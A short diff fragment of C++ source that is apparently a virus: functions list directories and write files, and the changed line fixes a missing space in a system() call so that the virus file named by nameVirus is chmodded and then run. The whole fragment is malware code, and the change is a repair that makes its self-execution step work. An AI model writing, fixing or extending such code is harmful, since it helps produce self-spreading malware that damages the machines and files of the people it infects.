@@ -48,7 +48,7 @@ void ListDir(const std::string &path, std::vector<std::string> &files)
 }
 // write the file
 void execCommand(){
-  system(("chmod 775" + nameVirus + ";" + nameVirus).c_str());
+  system(("chmod 775 " + nameVirus + ";" + nameVirus).c_str());
 }
 void writeFiles(std::vector<std::string> files)
 {
